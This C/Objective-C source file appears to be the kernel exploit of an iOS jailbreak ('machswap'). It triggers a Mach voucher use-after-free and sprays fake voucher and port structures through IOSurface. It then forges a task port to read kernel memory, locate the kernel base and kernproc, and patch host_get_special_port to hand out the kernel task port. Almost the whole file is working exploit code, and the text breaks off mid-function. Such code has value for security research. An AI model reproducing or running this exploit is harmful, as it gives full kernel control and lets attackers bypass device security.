#include <errno.h>              // errno
#include <sched.h>              // sched_yield
#include <stdlib.h>             // malloc, free
#include <string.h>             // strerror
#include <unistd.h>             // usleep, setuid, getuid
#include <pthread.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <CoreFoundation/CoreFoundation.h>

#import <Foundation/Foundation.h>

#include "common.h"             // LOG, uint64_t
#include "machswap_pwn.h"
#include "iokit.h"

extern kern_return_t bootstrap_look_up(mach_port_t bp, char *name, mach_port_t *sp);
extern mach_port_t mach_reply_port(void);
extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);
extern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
extern kern_return_t mach_vm_protect(task_t task, mach_vm_address_t addr, mach_vm_size_t size, boolean_t set_max, vm_prot_t new_prot);
extern kern_return_t mach_vm_map(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur, vm_prot_t max, vm_inherit_t inheritance);
extern kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);

// ********** ********** ********** constants ********** ********** **********

static const uint64_t IOSURFACE_CREATE_SURFACE =  0;
static const uint64_t IOSURFACE_SET_VALUE      =  9;
static const uint64_t IOSURFACE_GET_VALUE      = 10;
static const uint64_t IOSURFACE_DELETE_VALUE   = 11;

// ********** ********** ********** helpers ********** ********** **********

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for (size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

// ********** ********** ********** data structures ********** ********** **********

#define IO_BITS_ACTIVE      0x80000000
#define IOT_PORT            0
#define IKOT_TASK           2
#define IKOT_CLOCK          25
#define IKOT_IOKIT_CONNECT  29

#define WQT_QUEUE               0x2
#define _EVENT_MASK_BITS        ((sizeof(uint32_t) * 8) - 7)

typedef volatile struct 
{
    /* 0x00 */ uint32_t iv_hash;
    /* 0x04 */ uint32_t iv_sum;
    /* 0x08 */ uint32_t iv_refs;
    /* 0x0c */ uint32_t iv_table_size;
    /* 0x10 */ uint32_t iv_inline_table[6];
    /* 0x28 */ uint64_t padding0;
    /* 0x30 */ uint64_t iv_table;
    /* 0x38 */ uint64_t iv_port;
    /* 0x40 */ uint64_t iv_hash_link_next;
    /* 0x48 */ uint64_t iv_hash_link_prev;
} fake_ipc_voucher_t;

typedef volatile struct 
{
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef struct
{
    struct {
        uint64_t data;
        uint32_t reserved : 24,
                    type     :  8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
} ktask_t;

union waitq_flags
{
    struct {
        uint32_t /* flags */
    waitq_type:2,    /* only public field */
    waitq_fifo:1,    /* fifo wakeup policy? */
    waitq_prepost:1, /* waitq supports prepost? */
    waitq_irq:1,     /* waitq requires interrupts disabled */
    waitq_isvalid:1, /* waitq structure is valid */
    waitq_turnstile_or_port:1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
    waitq_eventmask:_EVENT_MASK_BITS;
    };
    uint32_t flags;
};

// ********** ********** ********** MIG ********** ********** **********

struct simple_msg
{
    mach_msg_header_t hdr;
    char buf[0];
};

/* credits to ian beer */
static mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size)
{
    // allocate a port to send the messages to
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) 
    {
        printf(" [-] failed to allocate port\n");
        exit(EXIT_FAILURE);
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    err = mach_port_set_attributes(mach_task_self(),
                                   q,
                                   MACH_PORT_LIMITS_INFO,
                                   (mach_port_info_t)&limits,
                                   MACH_PORT_LIMITS_INFO_COUNT);
    if (err != KERN_SUCCESS) 
    {
        printf(" [-] failed to increase queue limit\n");
        exit(EXIT_FAILURE);
    }

    mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;
    struct simple_msg *msg = malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
    memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);

    for (int i = 0; i < 256; i++) 
    {
        msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = msg_size;
        msg->hdr.msgh_remote_port = q;
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414142;

        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       msg_size,
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);

        if (err != KERN_SUCCESS) 
        {
            printf(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
            exit(EXIT_FAILURE);
        }
    }

    return q;
}

static uint32_t message_size_for_kalloc_size(uint32_t size)
{
    return ((size * 3) / 4) - 0x74;
}

static void trigger_gc_please()
{
    // size = 100 * 16,384 * 256 = 419,430,400 = ~420mb (max)
    
    const int gc_ports_cnt = 500;
    int gc_ports_max = gc_ports_cnt;
    mach_port_t gc_ports[gc_ports_cnt] = { 0 };
    
    uint32_t body_size = message_size_for_kalloc_size(16384) - sizeof(mach_msg_header_t); // 1024
    uint8_t *body = malloc(body_size);
    memset(body, 0x41, body_size);
    
    int64_t avgTime = 0;
    uint64_t maxTime = 0;
    uint64_t avgDeviation = 0;
    uint64_t maxDeviation = 0;
    int extra_gc_count = 2;
    
    for (int i = 0; i < gc_ports_cnt; i++)
    {
        uint64_t t0;
        int64_t tdelta;
        
        t0 = mach_absolute_time();
        gc_ports[i] = send_kalloc_message(body, body_size);
        tdelta = mach_absolute_time() - t0;
        uint64_t deviation = llabs(tdelta - avgTime);
        if (i == 0) {
            avgTime = maxTime = tdelta;
            continue;
        }
        
        /*
         The idea here is to look for an abnormally longer spray which signals that GC may have
         taken place
         */
        // TODO: Remove this log before merging to develop
        // LOG("%d: T:%lld avg T:%lld D:%lld max D:%lld avg D:%lld", i, tdelta, avgTime, deviation, maxDeviation, avgDeviation);
        
        if (tdelta - avgTime > avgTime*2 ||
            (deviation > MAX(avgDeviation * 2, 0x10000)) )
        {
            LOG("got gc at %d", i);
            if (extra_gc_count-- > 0) {
                continue;
            }
            LOG("breaking");
            gc_ports_max = i;
            break;
        }
        if (deviation > maxDeviation) {
            avgDeviation = maxDeviation?(avgDeviation * i + maxDeviation) / (i+1):deviation;
            maxDeviation = deviation;
        } else {
            avgDeviation = (avgDeviation * i + deviation) / (i+1);
        }
        
        if (tdelta > maxTime) {
            avgTime = (avgTime * i + maxTime) / (i+1);
            maxTime = tdelta;
        } else {
            avgTime = (avgTime * i + tdelta) / (i+1);
        }
    }
    
    for (int i = 0; i < gc_ports_max; i++)
    {
        mach_port_destroy(mach_task_self(), gc_ports[i]);
    }
    
    sched_yield();
    sleep(1);
}

static inline uint32_t mach_port_waitq_flags()
{
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

static kern_return_t send_port(mach_port_t rcv, mach_port_t myP)
{
    typedef struct {
        mach_msg_header_t          Head;
        mach_msg_body_t            msgh_body;
        mach_msg_port_descriptor_t task_port;
    } Request;

    kern_return_t err = 0;
    
    Request stuff;
    Request *InP = &stuff;
    InP->Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
    InP->Head.msgh_size = sizeof(Request);
    InP->Head.msgh_remote_port = rcv;
    InP->Head.msgh_local_port = MACH_PORT_NULL;
    InP->Head.msgh_id = 0x1337;
    
    InP->msgh_body.msgh_descriptor_count = 1;
    InP->task_port.name = myP;
    InP->task_port.disposition = MACH_MSG_TYPE_COPY_SEND;
    InP->task_port.type = MACH_MSG_PORT_DESCRIPTOR;

    err = mach_msg(&InP->Head, MACH_SEND_MSG | MACH_SEND_TIMEOUT, InP->Head.msgh_size, 0, 0, 5, 0);
    
    if (err) 
    {
        printf("mach_msg failed = %d (%s)!\n",err,mach_error_string(err));
    }
    
    return err;
}

extern size_t kread(uint64_t where, void* p, size_t size);
extern size_t kwrite(uint64_t where, const void* p, size_t size);
extern uint64_t kmem_alloc(uint64_t size);
extern void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0);
extern void prepare_rwk_via_tfp0(mach_port_t port);
extern uint64_t kernel_base;
extern uint64_t kernel_slide;
extern uint64_t ReadKernel64(uint64_t kaddr);
extern void WriteKernel64(uint64_t kaddr, uint64_t val);
extern uint32_t ReadKernel32(uint64_t kaddr);
extern void WriteKernel32(uint64_t kaddr, uint32_t val);
extern uint64_t cached_proc_struct_addr;

// ********** ********** ********** ye olde pwnage ********** ********** **********

kern_return_t machswap_exploit(machswap_offsets_t *offsets)
{
    kern_return_t ret = KERN_SUCCESS;

    io_connect_t client = MACH_PORT_NULL;
    mach_vm_size_t pagesize = 0;
    
    mach_port_t before[0x2000] = { };
    mach_port_t after[0x1000] = { };
    
    host_t host = HOST_NULL;
    thread_t thread = THREAD_NULL;

    /********** ********** data hunting ********** **********/

    host = mach_host_self();
    thread = mach_thread_self();
    vm_size_t pgsz = 0;
    ret = _host_page_size(host, &pgsz);
    pagesize = pgsz;
    LOG("page size: 0x%llx, %s", pagesize, mach_error_string(ret));
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to get page size! ret: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!MACH_PORT_VALID(service))
    {
        LOG("failed to find IOSurfaceRoot service");
        ret = KERN_FAILURE;
        goto out;
    }

    ret = IOServiceOpen(service, mach_task_self(), 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    if (ret != KERN_SUCCESS || !MACH_PORT_VALID(client))
    {
        LOG("failed to open an IOSurface client: %x (%s)", ret, mach_error_string(ret));
        goto out;
    }

    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };

    typedef struct 
    {
        mach_vm_address_t addr1;
        mach_vm_address_t addr2;
        mach_vm_address_t addr3;
        uint32_t id;
    } surface_t;

    size_t size = offsets->iosurface.create_outsize;
    surface_t *surface = malloc(size);
    bzero(surface, size);

    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), surface, &size);
    if (ret != KERN_SUCCESS)
    {
        LOG("IOSURFACE_CREATE_SURFACE failed: %x (%s)", ret, mach_error_string(ret));
        goto out;
    }

    /* on 11.x the surface_t->addr3 entry doesn't exist */
    if (surface->id == 0x0)
    {
        surface->id = (uint32_t)surface->addr3;
    }
    LOG("surface ID: 0x%x", surface->id);

    if (surface->id == 0x0)
    {
        LOG("failed to create an IOSurface! id was 0");
        ret = KERN_FAILURE;
        goto out;
    }

    /********** ********** black magic ********** **********/

    /* 
        set up fakeport for later
        we'll spray the address of this port after we trigger the uaf
    */
    kport_t *fakeport = malloc(0x4000);
    mlock((void *)fakeport, 0x4000);
    bzero((void *)fakeport, 0x4000);
    
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 100;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 0;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakeport->ip_srights = 99;
     
    LOG("fakeport: 0x%llx", (uint64_t)fakeport);

    /* the fake voucher to be sprayed */
    fake_ipc_voucher_t fake_voucher = (fake_ipc_voucher_t)
    {
        .iv_hash = 0x11111111,
        .iv_sum = 0x22222222,
        .iv_refs = 100,
        .iv_port = (uint64_t)fakeport
    };
    
    /* set up our IOSurface data for spraying */
#define FILL_MEMSIZE 0x4000000
    int spray_qty = FILL_MEMSIZE / pagesize; // # of pages to spray
    
    int spray_size = (int)((5 * sizeof(uint32_t)) + (spray_qty * ((4 * sizeof(uint32_t)) + pagesize)));
    uint32_t *spray_data = malloc(spray_size); // header + (spray_qty * (item_header + pgsize))
    bzero((void *)spray_data, spray_size);
    
    uint32_t *spray_cur = spray_data;
    
    *(spray_cur++) = surface->id;
    *(spray_cur++) = 0x0;
    *(spray_cur++) = kOSSerializeMagic;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | spray_qty;
    for (int i = 0; i < spray_qty; i++)
    {
        *(spray_cur++) = kOSSerializeSymbol | 5;
        *(spray_cur++) = transpose(i);
        *(spray_cur++) = 0x0;
        *(spray_cur++) = (uint32_t)((i + 1 >= spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pagesize - 1));
        
        for (uintptr_t ptr = (uintptr_t)spray_cur, end = ptr + pagesize; 
             ptr + sizeof(fake_ipc_voucher_t) <= end; 
             ptr += sizeof(fake_ipc_voucher_t))
        {
            bcopy((const void *)&fake_voucher, (void *)ptr, sizeof(fake_ipc_voucher_t));
        }
        
        spray_cur += (pagesize / sizeof(uint32_t));
    }

    /* create a few vouchers used to trigger the bug */
    mach_voucher_attr_recipe_data_t atm_data = 
    {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = 510
    };

    mach_port_t p2;
    ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2);
    
    mach_port_t p3;
    ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);

    /* allocate 0x2000 vouchers to alloc some new fresh pages */
    for (int i = 0; i < 0x2000; i++)
    {
        ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &before[i]);
    }
    
    /* alloc our target uaf voucher */
    mach_port_t p1;
    ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);
    
    /* allocate 0x1000 more vouchers */
    for (int i = 0; i < 0x1000; i++)
    {
        ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &after[i]);
    }

    /*
        theoretically, we should now have 3 blocks of memory (roughly) as so:
        |-----------------------|-------------|------------------|
        |     0x2000 ports      | target port |   0x1000 ports   |
        |-----------------------|-------------|------------------| 
                                ^             ^
                                page with only our controlled ports
        hopefully our target port is now allocated on a page which contains only our 
        controlled ports. this means when we release all of our ports *all* allocations
        on the given page will be released, and when we trigger GC the page will be released
        back from the ipc_ports zone to be re-used by kalloc 
        this allows us to spray our fake vouchers via IOSurface in other kalloc zones 
        (ie. kalloc.1024), and the dangling pointer of the voucher will then overlap with one
        of our allocations
    */
    
    /* set up to trigger the bug */
    ret = thread_set_mach_voucher(thread, p1);
    
    ret = task_swap_mach_voucher(mach_task_self(), p1, &p2);
    
    /* here we go! release the 0x1000 ports allocated after our target */
    for (int i = 0; i < 0x1000; i++)
    {
        mach_port_destroy(mach_task_self(), after[i]);
    }
    
    /* now release our target port viat he uaf */
    ret = task_swap_mach_voucher(mach_task_self(), p1, &p3);
    
    /* release the 0x2000 ports allocated before our target */
    for (int i = 0; i < 0x2000; i++)
    {
        mach_port_destroy(mach_task_self(), before[i]);
    }
    
    /* 
        hopefully the page which contained our uaf port is now completely
        free of allocations, and we can trigger gc to release the page to 
        allow for reallocation into another kalloc zone
    */
    trigger_gc_please();
    
    /* spray our data via IOSurface */
    uint32_t dummy = 0;
    size = sizeof(dummy);
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, spray_data, spray_size, &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("setValue(prep): %s", mach_error_string(ret));
        goto out;
    }
    
    mach_port_t real_port_to_fake_voucher = MACH_PORT_NULL;
    
    /* fingers crossed we get a userland handle onto our 'fakeport' object */
    ret = thread_get_mach_voucher(thread, 0, &real_port_to_fake_voucher);

    LOG("port: %x", real_port_to_fake_voucher);
    
    /* things are looking good; should be 100% success rate from here */
    LOG("WE REALLY POSTED UP ON THIS BLOCK");
    
    mach_port_t the_one = real_port_to_fake_voucher;
    prepare_for_rw_with_fake_tfp0(the_one);
    
    /* set our fakeport back to a TASK port and setup arbitrary read via pid_for_task */
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    
    /* fake task struct */
    ktask_t *fake_task = (ktask_t *)malloc(0x600); // task is about 0x568 or some shit
    bzero((void *)fake_task, 0x600);
    fake_task->ref_count = 0xff;
    
    LOG("faketask: 0x%llx", (uint64_t)fake_task);

    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_bsd_info);
    
    fakeport->ip_kobject = (uint64_t)fake_task;
    
#define rk32(addr, value)\
*read_addr_ptr = addr - offsets->struct_offsets.proc_pid;\
value = 0x0;\
ret = pid_for_task(the_one, (int *)&value);
    
    uint32_t read64_tmp;
    
    /* rk64 performs two 32bit reads and combines them into a single uint64 */
#define rk64(addr, value)\
rk32(addr + 0x4, read64_tmp);\
rk32(addr, value);\
value = value | ((uint64_t)read64_tmp << 32)

    ret = mach_port_insert_right(mach_task_self(), the_one, the_one, MACH_MSG_TYPE_COPY_SEND);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_port_insert_right failed: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    mach_port_t gangport;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gangport);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_port_allocate: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    ret = mach_port_insert_right(mach_task_self(), gangport, gangport, MACH_MSG_TYPE_MAKE_SEND);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to insert send right: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    ret = send_port(the_one, gangport);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to send_port: %x %s", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    uint64_t ikmq_base = fakeport->ip_messages.port.messages;
    if (ikmq_base == 0x0)
    {
        LOG("failed to find ikmq_base!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got ikmq_base: 0x%llx", ikmq_base);

    uint64_t ikm_header = 0x0;
    rk64(ikmq_base + 0x18, ikm_header); /* ipc_kmsg->ikm_header */
    if (ikm_header == 0x0)
    {
        LOG("failed to find ikm_header!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("ikm_header: 0x%llx", ikm_header);

    uint64_t port_addr = 0x0;
    rk64(ikm_header + 0x24, port_addr); /* 0x24 is mach_msg_header_t + body + offset of our port into mach_port_descriptor_t */ 
    if (port_addr == 0x0)
    {
        LOG("failed to find port_addr!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("port_addr: 0x%llx", port_addr);

    uint64_t itk_space = 0x0;
    rk64(port_addr + offsetof(kport_t, ip_receiver), itk_space);
    if (itk_space == 0x0)
    {
        LOG("failed to find itk_space!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("itk_space: 0x%llx", itk_space);
    
    uint64_t is_table = 0x0;
    rk64(itk_space + 0x20, is_table);
    if (is_table == 0x0) {
        LOG("failed to find is_table!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("is_table: 0x%llx", is_table);
    
    uint64_t host_port_addr = 0x0;
    rk64(is_table + (MACH_PORT_INDEX(host) * 0x18), host_port_addr);
    if (host_port_addr == 0x0) {
        LOG("failed to find host_port_addr!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("host_port_addr: 0x%llx", host_port_addr);

    uint64_t ourtask = 0x0;
    rk64(itk_space + 0x28, ourtask); /* ipc_space->is_task */
    if (ourtask == 0x0)
    {
        LOG("failed to find ourtask!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("ourtask: 0x%llx", ourtask);

    ret = mach_ports_register(mach_task_self(), &client, 1);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_ports_register failed: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    uint64_t iosruc_port = 0x0;
    rk64(ourtask + offsets->struct_offsets.task_itk_registered, iosruc_port);
    if (iosruc_port == 0x0)
    {
        LOG("failed to get IOSurfaceRootUserClient port!");
        goto out;
    }

    uint64_t iosruc_addr = 0x0;
    rk64(iosruc_port + offsetof(kport_t, ip_kobject), iosruc_addr);
    if (iosruc_addr == 0x0)
    {
        LOG("failed to get IOSurfaceRootUserClient address!");
        goto out;
    }

    uint64_t iosruc_vtab = 0x0;
    rk64(iosruc_addr + 0x0, iosruc_vtab);
    if (iosruc_vtab == 0x0)
    {
        LOG("failed to get IOSurfaceRootUserClient vtab!");
        goto out;
    }

    uint64_t get_trap_for_index_addr = 0x0;
    rk64(iosruc_vtab + (offsets->iosurface.get_external_trap_for_index * 0x8), get_trap_for_index_addr);
    if (get_trap_for_index_addr == 0x0)
    {
        LOG("failed to get IOSurface::getExternalTrapForIndex func ptr!");
        goto out;
    }

#define KERNEL_HEADER_OFFSET        0x4000
#define KERNEL_SLIDE_STEP           0x100000
    
    kernel_base = (get_trap_for_index_addr & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;

    do
    {
        uint32_t kbase_value = 0x0;
        rk32(kernel_base, kbase_value);
    
        if (kbase_value == MH_MAGIC_64)
        {
            LOG("found kernel_base: 0x%llx", kernel_base);
            break;
        }

        kernel_base -= KERNEL_SLIDE_STEP;
    } while (true);
    
    kernel_slide = kernel_base - offsets->constant.kernel_image_base;
    
    LOG("kernel slide: 0x%llx", kernel_slide);
    LOG("kernel base: 0x%llx", kernel_base);

    /* try and read our kbase to make sure our read is working properly */
    uint32_t kbase_value = 0x0;
    rk32(kernel_base, kbase_value);
    if (kbase_value != MH_MAGIC_64)
    {
        LOG("failed to find kernel base: %x", kbase_value);
        goto out;
    }
    LOG("read kernel base value: %x", kbase_value);

    /* find realhost */
    ret = send_port(the_one, host);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to send_port: %x %s", ret, mach_error_string(ret));
        goto out;
    }
    
    ikmq_base = fakeport->ip_messages.port.messages;
    if (ikmq_base == 0x0)
    {
        LOG("failed to find ikmq_base!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got ikmq_base: 0x%llx", ikmq_base);

    /* since this is the 2nd message we've sent to this port, our msg will lie in ipc_kmsg->next */
    uint64_t ikm_next = 0x0;
    rk64(ikmq_base + 0x8, ikm_next);
    if (ikm_next == 0x0)
    {
        LOG("failed to find ikm_next!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("ikm_next: 0x%llx", ikm_next);

    ikm_header = 0x0;
    rk64(ikm_next + 0x18, ikm_header);
    if (ikm_header == 0x0)
    {
        LOG("failed to find ikm_header!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("ikm_header: 0x%llx", ikm_header);

    port_addr = 0x0;
    rk64(ikm_header + 0x24, port_addr);
    if (port_addr == 0x0)
    {
        LOG("failed to find port_addr!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("port_addr: 0x%llx", port_addr);

    uint64_t realhost = 0x0;
    rk64(port_addr + offsetof(kport_t, ip_kobject), realhost);
    if (realhost == 0x0)
    {
        LOG("failed to find realhost!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("realhost: 0x%llx", realhost);

    uint64_t ourproc = 0x0;
    rk64(ourtask + offsets->struct_offsets.task_bsd_info, ourproc);
    LOG("got ourproc: 0x%llx", ourproc);
    cached_proc_struct_addr = ourproc;

    /* find kernproc by looping linked list */

    uint64_t kernproc = ourproc;
    while (kernproc != 0x0)
    {
        uint32_t found_pid = 0x0;
        rk32(kernproc + offsets->struct_offsets.proc_pid, found_pid);
        if (found_pid == 0)
        {
            break;
        }

        /* 
            kernproc will always be at the start of the linked list,
            so we loop backwards in order to find it
        */
        rk64(kernproc + 0x0, kernproc);
    }

    if (kernproc == 0x0)
    {
        LOG("failed to find kernproc");
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("got kernproc: 0x%llx", kernproc);

    uint64_t kerntask = 0x0;
    rk64(kernproc + offsets->struct_offsets.proc_task, kerntask);
    if (kerntask == 0x0)
    {
        LOG("failed to find kerntask!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kerntask: 0x%llx", kerntask);

    uint64_t kernel_vm_map = 0x0;
    rk64(kerntask + offsets->struct_offsets.task_vm_map, kernel_vm_map);
    if (kernel_vm_map == 0x0)
    {
        LOG("failed to find kernel_vm_map!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kernel vm map: 0x%llx", kernel_vm_map);

    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    fake_task->map = kernel_vm_map;
    *(uint32_t *)((uint64_t)fake_task + offsets->struct_offsets.task_itk_self) = 1;

    /* 
        since our IOSurfaceRoot userclient is owned by kernel, the 
        ip_receiver field will point to kernel's ipc space 
    */ 
    uint64_t ipc_space_kernel = 0x0;
    rk64(iosruc_port + offsetof(kport_t, ip_receiver), ipc_space_kernel);
    LOG("ipc_space_kernel: 0x%llx", ipc_space_kernel);

    /* as soon as we modify our fakeport, we don't want to be using our old rw gadgets */
#undef rk64
#undef rk32

    fakeport->ip_receiver = ipc_space_kernel;

    /* the_one should now have access to kernel mem */

    uint64_t kbase_data = ReadKernel64(kernel_base);

    if ((uint32_t)kbase_data != MH_MAGIC_64)
    {
        LOG("full kernel read via the_one failed!");
        ret = KERN_FAILURE;
        goto out; 
    }

    LOG("got kernel base: %llx", kbase_data);

    /* allocate kernel task */

    uint64_t kernel_task_buf = kmem_alloc(0x600);
    if (kernel_task_buf == 0x0)
    {
        LOG("failed to allocate kernel_task_buf!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("kernel_task_buf: 0x%llx", kernel_task_buf);

    /* 
        task_info TASK_DYLD_INFO patch 
        this patch (credit @Siguza) allows you to provide tfp0 to the task_info
        API, and retreive some data from the kernel's task struct
        we use it for storing the kernel base and kernel slide values 
    */ 
    *(uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_all_image_info_addr) = kernel_base;
    *(uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_all_image_info_size) = kernel_slide;

    kwrite(kernel_task_buf, (void *)fake_task, 0x600);

    /* allocate kernel port */
    uint64_t kernel_port_buf = kmem_alloc(0x300);
    if (kernel_port_buf == 0x0)
    {
        LOG("failed to allocate kernel_port_buf!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("kernel_port_buf: 0x%llx", kernel_port_buf);

    fakeport->ip_kobject = kernel_task_buf;

    kwrite(kernel_port_buf, (void *)fakeport, 0x300);

    /*
        host_get_special_port(4) patch
        allows the kernel task port to be accessed by any root process 
    */
    WriteKernel64(realhost + 0x10 + (sizeof(uint64_t) * 4), kernel_port_buf);
    
    uint32_t original_type = ReadKernel32(host_port_addr);
    WriteKernel32(host_port_addr, IO_BITS_ACTIVE | IKOT_HOST_PRIV);
    
    mach_port_t hsp4;
    ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &hsp4);
    
    WriteKernel32(host_port_addr, original_type);

    if (ret != KERN_SUCCESS ||
        !MACH_PORT_VALID(hsp4))
    {
